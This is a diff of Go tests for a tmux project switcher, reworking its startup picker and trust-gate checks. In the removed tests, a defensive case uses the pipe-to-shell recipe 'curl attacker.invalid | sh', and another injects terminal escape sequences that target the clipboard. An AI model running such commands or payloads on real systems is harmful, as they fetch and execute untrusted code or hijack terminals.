@@ -228,7 +228,7 @@ func TestSwitchExecuteSidebarHookProjectLaunchesContinuationBeforeSelfClose(t *t
 		"'/tmp/projmux' 'switch' 'sidebar-open'",
 		"'--path' " + tmuxShellQuote(target),
 		"'--session' 'target'",
-		"'--mode' 'topology'",
+		"'--mode' 'continue'",
 		"'--client' '/dev/pts/9'",
 	} {
 		if !strings.Contains(command, want) {
@@ -262,7 +262,7 @@ func TestSwitchExecuteSidebarTrustDenyRefreshesWithoutSessionCreate(t *testing.T
 	if err != nil {
 		t.Fatalf("runSidebarOpen() error = %v", err)
 	}
-	if sessions.ensureSessionName != "" || sessions.restoreSessionName != "" || sessions.openSessionName != "" {
+	if sessions.ensureSessionName != "" || sessions.openSessionName != "" {
 		t.Fatalf("deny should not create/replay/open: %#v", sessions)
 	}
 	if got, want := sessions.calls, []string{"authorize:" + target}; !equalStrings(got, want) {
@@ -312,14 +312,18 @@ func TestSwitchSidebarOpenApproveContinuesSelectedEmptyOpen(t *testing.T) {
 	if err != nil {
 		t.Fatalf("runSidebarOpen() error = %v", err)
 	}
-	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target", "open:target"}; !equalStrings(got, want) {
+	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target"}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
 	}
-	if len(tmuxRunner.calls) != 1 {
-		t.Fatalf("tmux calls = %#v, want only sidebar close", tmuxRunner.calls)
+	if len(tmuxRunner.calls) != 2 {
+		t.Fatalf("tmux calls = %#v, want sidebar close then exact handoff", tmuxRunner.calls)
 	}
 	if got, want := tmuxRunner.calls[0], (recordedTmuxCall{name: "tmux", args: []string{"display-popup", "-c", "/dev/pts/9", "-C"}}); !reflect.DeepEqual(got, want) {
 		t.Fatalf("close call = %#v, want %#v", got, want)
+	}
+	wantHandoff := recordedTmuxCall{name: "tmux", args: []string{"-L", "projmux", "switch-client", "-c", "/dev/pts/9", "-t", "=target"}}
+	if !reflect.DeepEqual(tmuxRunner.calls[1], wantHandoff) {
+		t.Fatalf("final handoff = %#v, want %#v", tmuxRunner.calls[1], wantHandoff)
 	}
 }
 
@@ -358,7 +362,7 @@ func TestSwitchSidebarOpenTrustPopupUsesClientScope(t *testing.T) {
 	if err != nil {
 		t.Fatalf("runSidebarOpen() error = %v", err)
 	}
-	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target", "open:target"}; !equalStrings(got, want) {
+	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target"}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
 	}
 	if len(popupRunner.calls) != 1 {
@@ -1049,7 +1053,7 @@ func TestSwitchCommandSidebarFocusOpensExistingSession(t *testing.T) {
 	}
 }
 
-func TestSwitchProjectOpenStartupPickerShowsLatestNamedAndEmpty(t *testing.T) {
+func TestSwitchProjectOpenStartupPickerHasExactlyTwoActions(t *testing.T) {
 	t.Parallel()
 
 	home := t.TempDir()
@@ -1058,46 +1062,22 @@ func TestSwitchProjectOpenStartupPickerShowsLatestNamedAndEmpty(t *testing.T) {
 	if err := os.MkdirAll(project, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	stateDir := filepath.Join(home, "state", "projmux", "sessions")
-	store := sessionstate.NewStore(stateDir)
-	saveSwitchProjectStartupSnapshot(t, store, "workspace")
-	if err := corelayout.NewStore(project).Save("team", corelayout.Preset{
-		SchemaVersion: corelayout.SchemaVersion,
-		Description:   "team workspace",
-		Windows: []corelayout.Window{{
-			Index:           0,
-			Name:            "shell",
-			ActivePaneIndex: 0,
-			Panes:           []corelayout.Pane{{Index: 0, CWD: "${PROJMUX_CWD}", Recipe: sessionstate.ShellRecipe()}},
-		}},
-	}); err != nil {
-		t.Fatal(err)
-	}
-	namedPath := filepath.Join(project, ".projmux", "layouts", "team.toml")
-	namedSavedAt := time.Date(2026, time.May, 13, 13, 14, 15, 0, time.UTC)
-	if err := os.Chtimes(namedPath, namedSavedAt, namedSavedAt); err != nil {
-		t.Fatalf("Chtimes() error = %v", err)
-	}
 
 	var startupOptions intpickercompat.Options
 	executor := &capturingSwitchSessionExecutor{}
-	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(o intpickercompat.Options) { startupOptions = o },
-			reply: intpickercompat.Result{Value: projectStartupValueTopology}},
-	})
+	runner, native := scriptedPicker(t, []pickerStep{{
+		observe: func(o intpickercompat.Options) { startupOptions = o },
+		reply:   intpickercompat.Result{Value: projectStartupValueTopology},
+	}})
 	cmd := &switchCommand{
 		sessions: executor,
 		identity: stubSwitchIdentityResolver{name: "workspace"},
 		homeDir:  func() (string, error) { return home, nil },
 		lookupEnv: func(name string) string {
-			switch name {
-			case "XDG_STATE_HOME":
-				return filepath.Join(home, "state")
-			case "XDG_CONFIG_HOME":
+			if name == "XDG_CONFIG_HOME" {
 				return filepath.Join(home, "config")
-			default:
-				return ""
 			}
+			return ""
 		},
 		runner:       runner,
 		nativePicker: native,
@@ -1109,26 +1089,19 @@ func TestSwitchProjectOpenStartupPickerShowsLatestNamedAndEmpty(t *testing.T) {
 	if got, want := startupOptions.UI, "project-startup"; got != want {
 		t.Fatalf("startup UI = %q, want %q", got, want)
 	}
-	requireSwitchEntryLabel(t, startupOptions.Entries, "Latest snapshot")
-	requireSwitchEntryLabel(t, startupOptions.Entries, "Named snapshot")
-	requireSwitchEntryLabel(t, startupOptions.Entries, "Project topology")
-	requireSwitchEntryLabel(t, startupOptions.Entries, projectStartupNewLabel)
-	requireSwitchEntryLabel(t, startupOptions.Entries, "Back")
-	requireSwitchNoPrimaryLayoutPresetLabels(t, startupOptions.Entries)
-	requireSwitchEntryLabel(t, startupOptions.Entries, "2026-05-13 12:00:00")
-	requireSwitchEntryLabel(t, startupOptions.Entries, "2026-05-13 13:14:15")
+	if got, want := len(startupOptions.Entries), 2; got != want {
+		t.Fatalf("startup rows = %d, want %d: %#v", got, want, startupOptions.Entries)
+	}
+	requireSwitchEntryLabel(t, startupOptions.Entries, "Continue project")
+	requireSwitchEntryLabel(t, startupOptions.Entries, "Open fresh")
 	requireSwitchEntryValueOrder(t, startupOptions.Entries, []string{
-		projectStartupValueLatest,
-		projectStartupValueNamed + "team",
 		projectStartupValueTopology,
 		projectStartupValueNew,
-		settingsBackValue,
 	})
 	if got, want := executor.ensureSessionName, "workspace"; got != want {
 		t.Fatalf("ensure session = %q, want %q", got, want)
 	}
 }
-
 func TestUsageOmitsLayoutPrimaryCommand(t *testing.T) {
 	t.Parallel()
 
@@ -1144,7 +1117,7 @@ func TestUsageOmitsLayoutPrimaryCommand(t *testing.T) {
 	}
 }
 
-func TestSwitchSidebarProjectOpenShowsStartupStepWithoutDisplayPopupHandoff(t *testing.T) {
+func TestSwitchSidebarProjectStartupEscReturnsToProjectsWithoutHandoff(t *testing.T) {
 	t.Parallel()
 
 	home := t.TempDir()
@@ -1153,9 +1126,6 @@ func TestSwitchSidebarProjectOpenShowsStartupStepWithoutDisplayPopupHandoff(t *t
 	if err := os.MkdirAll(project, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	writeFile(t, filepath.Join(project, ".projmux", "config.toml"), "[startup]\nrun = \"make dev\"\n")
-	store := sessionstate.NewStore(filepath.Join(home, "state", "projmux", "sessions"))
-	saveSwitchProjectStartupSnapshot(t, store, "workspace")
 
 	var startupOptions intpickercompat.Options
 	executor := &capturingSwitchSessionExecutor{}
@@ -1166,18 +1136,14 @@ func TestSwitchSidebarProjectOpenShowsStartupStepWithoutDisplayPopupHandoff(t *t
 		tmuxRunner: tmux,
 		homeDir:    func() (string, error) { return home, nil },
 		lookupEnv: func(name string) string {
-			switch name {
-			case "XDG_STATE_HOME":
-				return filepath.Join(home, "state")
-			case "XDG_CONFIG_HOME":
+			if name == "XDG_CONFIG_HOME" {
 				return filepath.Join(home, "config")
-			default:
-				return ""
 			}
+			return ""
 		},
 		nativePicker: nativePickerFromCompatRunner(switchRunnerFunc(func(options intpickercompat.Options) (intpickercompat.Result, error) {
 			startupOptions = options
-			return intpickercompat.Result{Value: settingsBackValue}, nil
+			return intpickercompat.Result{}, nil
 		})),
 	}
 
@@ -1190,20 +1156,33 @@ func TestSwitchSidebarProjectOpenShowsStartupStepWithoutDisplayPopupHandoff(t *t
 		t.Fatalf("execute() error = %v", err)
 	}
 	if !reopen {
-		t.Fatal("execute() reopen = false, want project list after Back")
+		t.Fatal("execute() reopen = false, want project list after Esc")
 	}
 	if got, want := startupOptions.Header, "Start project"; got != want {
 		t.Fatalf("startup header = %q, want %q", got, want)
 	}
-	if got, want := startupOptions.UI, "project-startup"; got != want {
-		t.Fatalf("startup UI = %q, want %q", got, want)
+	if got, want := len(startupOptions.Entries), 2; got != want {
+		t.Fatalf("startup rows = %d, want %d", got, want)
 	}
-	requireSwitchEntryLabel(t, startupOptions.Entries, "Latest snapshot")
 	if len(tmux.calls) != 0 {
-		t.Fatalf("tmux calls = %#v, want no display-popup handoff", tmux.calls)
+		t.Fatalf("tmux calls = %#v, want no popup handoff", tmux.calls)
 	}
-	if executor.ensureSessionName != "" || executor.restoreSessionName != "" || executor.openSessionName != "" || executor.authorizeCalled {
-		t.Fatalf("startup Back should not create/replay/open/authorize: %#v", executor)
+	if executor.ensureSessionName != "" || executor.openSessionName != "" || executor.authorizeCalled {
+		t.Fatalf("Esc should not create/open/authorize: %#v", executor)
+	}
+}
+
+func TestProjectStartupPickerFailureFallsBackToContinue(t *testing.T) {
+	t.Parallel()
+	cmd := &switchCommand{
+		homeDir:   func() (string, error) { return t.TempDir(), nil },
+		lookupEnv: func(string) string { return "" },
+		nativePicker: nativePickerFromCompatRunner(switchRunnerFunc(func(intpickercompat.Options) (intpickercompat.Result, error) {
+			return intpickercompat.Result{}, errors.New("picker unavailable")
+		})),
+	}
+	if got := cmd.pickProjectStartupMode("workspace", "/tmp/workspace"); got.Kind != projectStartupKindTopology {
+		t.Fatalf("picker failure mode = %+v, want Continue project", got)
 	}
 }
 
@@ -1215,36 +1194,11 @@ func TestProjectStartupPickerLabelStateColors(t *testing.T) {
 		candidate projectStartupCandidate
 		wantColor string
 	}{
-		{
-			name:      "latest snapshot action",
-			candidate: projectStartupCandidate{Kind: projectStartupKindLatest, Description: "saved"},
-			wantColor: settingsColorType,
-		},
-		{
-			name:      "named snapshot action",
-			candidate: projectStartupCandidate{Kind: projectStartupKindNamed, Name: "team", Description: "manual"},
-			wantColor: settingsColorType,
-		},
-		{
-			name:      "project topology start action",
-			candidate: projectStartupCandidate{Kind: projectStartupKindTopology, Description: projectTopologyStartupDescription},
-			wantColor: settingsColorType,
-		},
-		{
-			name:      "back row secondary tone",
-			candidate: projectStartupCandidate{Kind: projectStartupKindBack, Description: "return"},
-			wantColor: settingsColorBack,
-		},
-		{
-			name:      "unknown info tone",
-			candidate: projectStartupCandidate{Kind: "other", Label: "Other", Description: "metadata"},
-			wantColor: settingsColorInfo,
-		},
+		{name: "continue", candidate: topologyProjectStartupCandidate(), wantColor: settingsColorType},
+		{name: "fresh", candidate: newProjectStartupCandidate(), wantColor: settingsColorRemove},
 	}
-
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			t.Parallel()
 			label := projectStartupPickerLabel(tc.candidate)
 			if !strings.Contains(label, tc.wantColor) {
 				t.Fatalf("projectStartupPickerLabel(%s) = %q, want color %q", tc.name, label, tc.wantColor)
@@ -1252,7 +1206,6 @@ func TestProjectStartupPickerLabelStateColors(t *testing.T) {
 		})
 	}
 }
-
 func TestAppRunLayoutCommandRemovedFromPublicSurface(t *testing.T) {
 	t.Parallel()
 
@@ -1262,294 +1215,13 @@ func TestAppRunLayoutCommandRemovedFromPublicSurface(t *testing.T) {
 	}
 }
 
-func TestSwitchProjectOpenLatestSnapshotSelectionRestoresAndOpens(t *testing.T) {
-	t.Parallel()
-
-	home := t.TempDir()
-	enableSidebarStartupPickerForTest(t, home)
-	project := filepath.Join(home, "workspace")
-	if err := os.MkdirAll(project, 0o755); err != nil {
-		t.Fatal(err)
-	}
-	stateDir := filepath.Join(home, "state", "projmux", "sessions")
-	store := sessionstate.NewStore(stateDir)
-	saveSwitchProjectStartupSnapshot(t, store, "workspace")
-	wantSnap, err := store.Load("workspace")
-	if err != nil {
-		t.Fatal(err)
-	}
-
-	executor := &capturingSwitchSessionExecutor{}
-	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(intpickercompat.Options) {
-			if executor.authorizeCalled {
-				t.Fatal("trust gate ran before latest snapshot startup selection")
-			}
-		}, reply: intpickercompat.Result{Value: projectStartupValueLatest}},
-	})
-	cmd := &switchCommand{
-		sessions: executor,
-		identity: stubSwitchIdentityResolver{name: "workspace"},
-		homeDir:  func() (string, error) { return home, nil },
-		lookupEnv: func(name string) string {
-			switch name {
-			case "XDG_STATE_HOME":
-				return filepath.Join(home, "state")
-			case "XDG_CONFIG_HOME":
-				return filepath.Join(home, "config")
-			default:
-				return ""
-			}
-		},
-		runner:       runner,
-		nativePicker: native,
-	}
-
-	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
-	}
-	if executor.ensureSessionName != "" {
-		t.Fatalf("EnsureSession called for latest snapshot restore: %q", executor.ensureSessionName)
-	}
-	if got, want := executor.restoreSessionName, "workspace"; got != want {
-		t.Fatalf("restore session = %q, want %q", got, want)
-	}
-	if got, want := executor.restoreSource, sessionstate.SourceAutosave; got != want {
-		t.Fatalf("restore source = %q, want %q", got, want)
-	}
-	if got, want := executor.restoreCWD, project; got != want {
-		t.Fatalf("restore cwd = %q, want %q", got, want)
-	}
-	wantSnap.SavedAt = executor.restoreSnapshot.SavedAt
-	if got, want := executor.restoreSnapshot, wantSnap; !reflect.DeepEqual(got, want) {
-		t.Fatalf("restore snapshot = %#v, want %#v", got, want)
-	}
-	if got, want := executor.openSessionName, "workspace"; got != want {
-		t.Fatalf("open session = %q, want %q", got, want)
-	}
-	if got, want := executor.calls, []string{"authorize:" + project, "restore:workspace:" + sessionstate.SourceAutosave, "open:workspace"}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want %q", got, want)
-	}
-}
-
-func TestSwitchProjectOpenNamedSnapshotSelectionRestoresAndOpens(t *testing.T) {
-	t.Parallel()
-
-	home := t.TempDir()
-	enableSidebarStartupPickerForTest(t, home)
-	project := filepath.Join(home, "workspace")
-	if err := os.MkdirAll(project, 0o755); err != nil {
-		t.Fatal(err)
-	}
-	preset := corelayout.Preset{
-		SchemaVersion: corelayout.SchemaVersion,
-		Description:   "team workspace",
-		Windows: []corelayout.Window{{
-			Index:           0,
-			Name:            "dev",
-			Layout:          "even-horizontal",
-			ActivePaneIndex: 1,
-			Panes: []corelayout.Pane{
-				{Index: 0, CWD: "${PROJMUX_CWD}", Recipe: sessionstate.ShellRecipe()},
-				{Index: 1, CWD: "${PROJMUX_CWD}/service", Recipe: sessionstate.StartupRecipe("make watch")},
-			},
-		}},
-	}
-	if err := corelayout.NewStore(project).Save("team", preset); err != nil {
-		t.Fatal(err)
-	}
-	wantSnap, err := corelayout.ToSnapshot(preset, "workspace", project, time.Time{})
-	if err != nil {
-		t.Fatal(err)
-	}
-	wantSource := layoutPresetSource("team", preset)
-
-	executor := &capturingSwitchSessionExecutor{}
-	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(intpickercompat.Options) {
-			if executor.authorizeCalled {
-				t.Fatal("trust gate ran before named snapshot startup selection")
-			}
-		}, reply: intpickercompat.Result{Value: projectStartupValueNamed + "team"}},
-	})
-	cmd := &switchCommand{
-		sessions: executor,
-		identity: stubSwitchIdentityResolver{name: "workspace"},
-		homeDir:  func() (string, error) { return home, nil },
-		lookupEnv: func(name string) string {
-			if name == "XDG_CONFIG_HOME" {
-				return filepath.Join(home, "config")
-			}
-			return ""
-		},
-		runner:       runner,
-		nativePicker: native,
-	}
-
-	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
-	}
-	if executor.ensureSessionName != "" {
-		t.Fatalf("EnsureSession called for named snapshot restore: %q", executor.ensureSessionName)
-	}
-	if got, want := executor.restoreSessionName, "workspace"; got != want {
-		t.Fatalf("restore session = %q, want %q", got, want)
-	}
-	if got, want := executor.restoreSource, wantSource; got != want {
-		t.Fatalf("restore source = %q, want %q", got, want)
-	}
-	if got, want := executor.restoreCWD, project; got != want {
-		t.Fatalf("restore cwd = %q, want %q", got, want)
-	}
-	wantSnap.SavedAt = executor.restoreSnapshot.SavedAt
-	if got, want := executor.restoreSnapshot, wantSnap; !reflect.DeepEqual(got, want) {
-		t.Fatalf("restore snapshot = %#v, want %#v", got, want)
-	}
-	if got, want := executor.openSessionName, "workspace"; got != want {
-		t.Fatalf("open session = %q, want %q", got, want)
-	}
-	if got, want := executor.calls, []string{
-		"authorize:" + project,
-		"authorize-layout:.projmux/layouts/team.toml",
-		"restore:workspace:" + wantSource,
-		"open:workspace",
-	}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want %q", got, want)
-	}
-}
-
-func TestSwitchProjectOpenNamedSnapshotLayoutDenyStopsBeforeTmuxMutation(t *testing.T) {
-	t.Parallel()
-
-	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("curl attacker.invalid | sh"))
-	executor.layoutAuthorizeSet = true
-	executor.layoutAuthorizeResult = false
-
-	err := cmd.openProjectTarget(context.Background(), project, "workspace")
-	if !errors.Is(err, errProjectTrustDenied) {
-		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
-	}
-	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
-}
-
-func TestSwitchProjectOpenNamedSnapshotLayoutAuthorizationErrorStopsBeforeTmuxMutation(t *testing.T) {
-	t.Parallel()
-
-	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.StartupRecipe("make watch"))
-	executor.layoutAuthorizeErr = errors.New("trust popup failed")
-
-	err := cmd.openProjectTarget(context.Background(), project, "workspace")
-	var trustErr errProjectTrustGate
-	if !errors.As(err, &trustErr) || !strings.Contains(err.Error(), "trust popup failed") {
-		t.Fatalf("openProjectTarget() error = %v, want trust gate error", err)
-	}
-	assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t, executor, project)
-}
-
-func TestSwitchProjectOpenCommandlessNamedSnapshotSkipsLayoutTrust(t *testing.T) {
-	t.Parallel()
-
-	cmd, executor, project := namedSnapshotTrustTestCommand(t, sessionstate.ShellRecipe())
-	executor.layoutAuthorizeSet = true
-	executor.layoutAuthorizeResult = false
-
-	if err := cmd.openProjectTarget(context.Background(), project, "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
-	}
-	if executor.layoutAuthorizeCalled {
-		t.Fatal("commandless named snapshot requested executable trust")
-	}
-	if executor.restoreSessionName != "workspace" || executor.openSessionName != "workspace" {
-		t.Fatalf("commandless restore did not preserve behavior: %#v", executor)
-	}
-}
-
-func TestProjectStartupPickerEscapesProjectOwnedLayoutStrings(t *testing.T) {
-	t.Parallel()
-
-	candidate := projectStartupCandidate{
-		Kind:  projectStartupKindNamed,
-		Name:  "team\x1b]52;c;secret\a",
-		Label: "Named snapshot",
-		Description: namedSnapshotDescription(corelayout.Entry{
-			Name:        "team\x1b[31m",
-			Description: "desc\u009b31m\u009dclipboard",
-			Windows:     1,
-			Panes:       1,
-		}),
-	}
-	options := projectStartupPickerOptions([]projectStartupCandidate{candidate})
-	entry := options.Entries[0]
-	for _, rendered := range []string{entry.Label, entry.SearchKey} {
-		plain := stripAnsi(rendered)
-		if strings.Contains(plain, "\x1b") || strings.Contains(plain, "\a") ||
-			strings.Contains(plain, "\u009b") || strings.Contains(plain, "\u009d") {
-			t.Fatalf("picker rendered project control sequence: %q", rendered)
-		}
-	}
-	if !strings.Contains(entry.Label, `\x1b`) || !strings.Contains(entry.SearchKey, `\x1b`) {
-		t.Fatalf("picker did not visibly escape controls: %#v", entry)
-	}
-}
-
-func namedSnapshotTrustTestCommand(t *testing.T, recipe sessionstate.Recipe) (*switchCommand, *capturingSwitchSessionExecutor, string) {
-	t.Helper()
-	home := t.TempDir()
-	enableSidebarStartupPickerForTest(t, home)
-	project := filepath.Join(home, "workspace")
-	if err := corelayout.NewStore(project).Save("team", corelayout.Preset{
-		SchemaVersion: corelayout.SchemaVersion,
-		Windows: []corelayout.Window{{
-			Index:           0,
-			ActivePaneIndex: 0,
-			Panes: []corelayout.Pane{{
-				Index:  0,
-				CWD:    "${PROJMUX_CWD}",
-				Recipe: recipe,
-			}},
-		}},
-	}); err != nil {
-		t.Fatal(err)
-	}
-	executor := &capturingSwitchSessionExecutor{}
-	runner, native := scriptedPicker(t, []pickerStep{{
-		reply: intpickercompat.Result{Value: projectStartupValueNamed + "team"},
-	}})
-	return &switchCommand{
-		sessions: executor,
-		identity: stubSwitchIdentityResolver{name: "workspace"},
-		homeDir:  func() (string, error) { return home, nil },
-		lookupEnv: func(name string) string {
-			if name == "XDG_CONFIG_HOME" {
-				return filepath.Join(home, "config")
-			}
-			return ""
-		},
-		runner:       runner,
-		nativePicker: native,
-	}, executor, project
-}
-
-func assertNamedSnapshotTrustStoppedBeforeTmuxMutation(t *testing.T, executor *capturingSwitchSessionExecutor, project string) {
-	t.Helper()
-	if got, want := executor.calls, []string{
-		"authorize:" + project,
-		"authorize-layout:.projmux/layouts/team.toml",
-	}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want %q; no restore/new-session/split/send-keys/open is allowed", got, want)
-	}
-	if executor.restoreSessionName != "" || executor.ensureSessionName != "" || executor.openSessionName != "" {
-		t.Fatalf("trust failure left partial session state: %#v", executor)
-	}
-}
-
 func TestSwitchProjectOpenExistingSessionSkipsStartupPicker(t *testing.T) {
 	t.Parallel()
 
 	var pickerCalled bool
 	executor := &capturingSwitchSessionExecutor{exists: map[string]bool{"workspace": true}}
 	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(intpickercompat.Options) { pickerCalled = true }},
+		{observe: func(intpickercompat.Options) { pickerCalled = true }, reply: intpickercompat.Result{Value: projectStartupValueTopology}},
 	})
 	cmd := &switchCommand{
 		sessions:     executor,
@@ -1606,7 +1278,7 @@ func TestSwitchProjectOpenTrustDenyAfterStartupSelectionAbortsWithoutSession(t *
 	var pickerCalled bool
 	executor := &capturingSwitchSessionExecutor{authorizeSet: true, authorizeResult: false}
 	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(intpickercompat.Options) { pickerCalled = true }},
+		{observe: func(intpickercompat.Options) { pickerCalled = true }, reply: intpickercompat.Result{Value: projectStartupValueTopology}},
 	})
 	cmd := &switchCommand{
 		sessions: executor,
@@ -1632,102 +1304,10 @@ func TestSwitchProjectOpenTrustDenyAfterStartupSelectionAbortsWithoutSession(t *
 	if !pickerCalled {
 		t.Fatal("startup picker was not called before trust gate")
 	}
-	if executor.restoreSessionName != "" {
-		t.Fatalf("snapshot restore ran after deny: restore=%q", executor.restoreSessionName)
-	}
 	if executor.ensureSessionName != "" || executor.ensureCWD != "" || executor.openSessionName != "" {
 		t.Fatalf("deny should not create/open a session: %#v", executor)
 	}
 	if got, want := executor.calls, []string{"authorize:/tmp/workspace"}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want %q", got, want)
-	}
-}
-
-func TestSwitchProjectOpenTrustDenyWithLatestSnapshotSkipsRestoreAndCreate(t *testing.T) {
-	t.Parallel()
-
-	home := t.TempDir()
-	enableSidebarStartupPickerForTest(t, home)
-	project := filepath.Join(home, "workspace")
-	if err := os.MkdirAll(project, 0o755); err != nil {
-		t.Fatal(err)
-	}
-	stateDir := filepath.Join(home, "state", "projmux", "sessions")
-	store := sessionstate.NewStore(stateDir)
-	saveSwitchProjectStartupSnapshot(t, store, "workspace")
-
-	executor := &capturingSwitchSessionExecutor{authorizeSet: true, authorizeResult: false}
-	runner, native := scriptedPicker(t, []pickerStep{
-		{reply: intpickercompat.Result{Value: projectStartupValueLatest}},
-	})
-	cmd := &switchCommand{
-		sessions: executor,
-		identity: stubSwitchIdentityResolver{name: "workspace"},
-		homeDir:  func() (string, error) { return home, nil },
-		lookupEnv: func(name string) string {
-			switch name {
-			case "XDG_STATE_HOME":
-				return filepath.Join(home, "state")
-			case "XDG_CONFIG_HOME":
-				return filepath.Join(home, "config")
-			default:
-				return ""
-			}
-		},
-		runner:       runner,
-		nativePicker: native,
-	}
-
-	err := cmd.openProjectTarget(context.Background(), project, "workspace")
-	if !errors.Is(err, errProjectTrustDenied) {
-		t.Fatalf("openProjectTarget() error = %v, want trust denied", err)
-	}
-	if executor.restoreSessionName != "" {
-		t.Fatalf("snapshot restore ran after trust deny: restore=%q", executor.restoreSessionName)
-	}
-	if executor.ensureSessionName != "" || executor.openSessionName != "" {
-		t.Fatalf("deny should not create/open a session: %#v", executor)
-	}
-	if got, want := executor.calls, []string{"authorize:" + project}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want %q", got, want)
-	}
-}
-
-// TestSwitchProjectOpenLegacyEmptyValueChecksTrustAfterStartupSelection pins the
-// retired `empty` picker value: it still resolves to the topology start rather
-// than an unknown mode, so a continuation launched across an upgrade keeps
-// working and the trust gate still runs after the startup selection.
-func TestSwitchProjectOpenLegacyEmptyValueChecksTrustAfterStartupSelection(t *testing.T) {
-	t.Parallel()
-
-	home := t.TempDir()
-	enableSidebarStartupPickerForTest(t, home)
-	executor := &capturingSwitchSessionExecutor{authorizeSet: true, authorizeResult: true}
-	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(intpickercompat.Options) {
-			if executor.authorizeCalled {
-				t.Fatal("trust gate ran before topology startup selection")
-			}
-		}, reply: intpickercompat.Result{Value: projectStartupValueEmpty}},
-	})
-	cmd := &switchCommand{
-		sessions: executor,
-		identity: stubSwitchIdentityResolver{name: "workspace"},
-		homeDir:  func() (string, error) { return home, nil },
-		lookupEnv: func(name string) string {
-			if name == "XDG_CONFIG_HOME" {
-				return filepath.Join(home, "config")
-			}
-			return ""
-		},
-		runner:       runner,
-		nativePicker: native,
-	}
-
-	if err := cmd.openProjectTarget(context.Background(), "/tmp/workspace", "workspace"); err != nil {
-		t.Fatalf("openProjectTarget() error = %v", err)
-	}
-	if got, want := executor.calls, []string{"authorize:/tmp/workspace", "ensure:workspace", "open:workspace"}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
 	}
 }
@@ -3643,10 +3223,6 @@ type capturingSwitchSessionExecutor struct {
 	ensureCWD             string
 	openSessionName       string
 	killSessionName       string
-	restoreSessionName    string
-	restoreCWD            string
-	restoreSource         string
-	restoreSnapshot       sessionstate.Snapshot
 	authorizeCalled       bool
 	authorizeResult       bool
 	authorizeSet          bool
@@ -3660,7 +3236,6 @@ type capturingSwitchSessionExecutor struct {
 	ensureErr             error
 	openErr               error
 	killErr               error
-	restoreErr            error
 	authorizeErr          error
 	layoutAuthorizeErr    error
 	existsErr             error
@@ -3789,15 +3364,6 @@ func (e *capturingSwitchSessionExecutor) AuthorizeProjectLayout(_ context.Contex
 		return e.layoutAuthorizeResult, nil
 	}
 	return true, nil
-}
-
-func (e *capturingSwitchSessionExecutor) RestoreSessionSnapshot(_ context.Context, snap sessionstate.Snapshot, cwd, source string) error {
-	e.restoreSessionName = snap.Session
-	e.restoreCWD = cwd
-	e.restoreSource = source
-	e.restoreSnapshot = snap
-	e.calls = append(e.calls, "restore:"+snap.Session+":"+source)
-	return e.restoreErr
 }
 
 func (e *capturingSwitchSessionExecutor) SessionExists(_ context.Context, sessionName string) (bool, error) {
@@ -4204,15 +3770,18 @@ func TestSwitchSidebarCommitRecordsOnceAfterMarkerRemoval(t *testing.T) {
 		t.Fatalf("openProjectTargetPathFromSidebar() error = %v", err)
 	}
 
-	if got, want := executor.calls, []string{"open:work-session"}; !reflect.DeepEqual(got, want) {
+	if got, want := executor.calls, []string(nil); !reflect.DeepEqual(got, want) {
 		t.Fatalf("session calls = %q, want %q", got, want)
 	}
 	if _, err := os.Stat(marker); !errors.Is(err, os.ErrNotExist) {
 		t.Fatalf("marker stat error = %v, want removed before commit record", err)
 	}
-	want := recordedTmuxCall{name: "tmux", args: []string{"run-shell", "-b", "'/tmp/projmux' 'window' 'record'"}}
-	if len(runner.calls) != 1 || !reflect.DeepEqual(runner.calls[0], want) {
-		t.Fatalf("tmux calls = %#v, want exactly one commit record %#v", runner.calls, want)
+	want := []recordedTmuxCall{
+		{name: "tmux", args: []string{"run-shell", "-b", "'/tmp/projmux' 'window' 'record'"}},
+		{name: "tmux", args: []string{"-L", "projmux", "switch-client", "-c", client, "-t", "=work-session"}},
+	}
+	if !reflect.DeepEqual(runner.calls, want) {
+		t.Fatalf("tmux calls = %#v, want commit then final handoff %#v", runner.calls, want)
 	}
 }
 
